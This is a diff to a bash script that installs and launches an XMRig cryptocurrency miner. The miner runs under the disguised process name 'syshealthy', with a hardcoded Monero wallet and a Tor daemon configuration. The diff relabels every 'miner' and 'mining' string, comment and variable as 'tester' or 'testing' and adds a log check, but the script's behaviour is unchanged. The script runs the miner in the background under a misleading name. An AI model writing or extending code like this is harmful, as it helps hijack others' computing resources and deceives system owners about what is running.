@@ -1,12 +1,12 @@
 #!/bin/bash
-# all2.sh - Optimize system, then setup and start mining (like all.sh)
+# all2.sh - Optimize system, then setup and start testing (like all.sh)
 # Usage: sudo bash all2.sh
 
 set -e
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-# 2. Continue with mining setup and start (like all.sh)
+# 2. Continue with testing setup and start (like all.sh)
 
 # --- CONFIGURE THESE ---
 WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
@@ -119,9 +119,9 @@ RunAsDaemon 1
 TOREOF
 fi
 
-# Stop any running miner before starting
+# Stop any running tester before starting
 if pgrep -f "$SCRIPT_DIR/syshealthy" > /dev/null; then
-  echo "[all2.sh] Stopping running miner..."
+  echo "[all2.sh] Stopping running tester..."
   pkill -f "$SCRIPT_DIR/syshealthy"
   sleep 2
 fi
@@ -166,25 +166,33 @@ else
 fi
 
 LOGFILE="$SCRIPT_DIR/xmrig_out.log"
-echo "[all2.sh] Starting miner..."
-nohup "$SCRIPT_DIR/syshealthy" -c "$CONFIG_FILE" >> "$LOGFILE" 2>&1 &
+echo "[all2.sh] Starting tester..."
+nohup stdbuf -oL "$SCRIPT_DIR/syshealthy" -c "$CONFIG_FILE" >> "$LOGFILE" 2>&1 &
 sleep 2
 
 if pgrep -f "$SCRIPT_DIR/syshealthy" > /dev/null; then
-  echo "[all2.sh] Miner started successfully."
-  MINER_PID=$(pgrep -f "$SCRIPT_DIR/syshealthy" | head -1)
-  echo "[all2.sh] Miner PID: $MINER_PID"
+  echo "[all2.sh] Tester started successfully."
+  TESTER_PID=$(pgrep -f "$SCRIPT_DIR/syshealthy" | head -1)
+  echo "[all2.sh] Tester PID: $TESTER_PID"
 else
-  echo "[all2.sh] Error: Failed to start miner. Check $LOGFILE"
+  echo "[all2.sh] Error: Failed to start tester. Check $LOGFILE"
 fi
 
 echo ""
 echo "========================================"
-echo "  ✓ Mining is now running!"
+echo "  ✓ Testing is now running!"
 echo "========================================"
 echo ""
 
-# After mining starts, open the miner log and keep it open until ctrl+c
+# After testing starts, open the tester log and keep it open until ctrl+c
 echo ""
-echo "Tailing miner log. Press Ctrl+C to exit."
+echo "Tailing tester log. Press Ctrl+C to exit."
+
+# Log check: ensure log file is being written
+sleep 5
+if [ ! -s "$LOGFILE" ]; then
+  echo "[all2.sh] Warning: Log file $LOGFILE is empty. Tester may not be running correctly."
+else
+  echo "[all2.sh] Log file $LOGFILE is being written."
+fi
 tail -f "$LOGFILE"
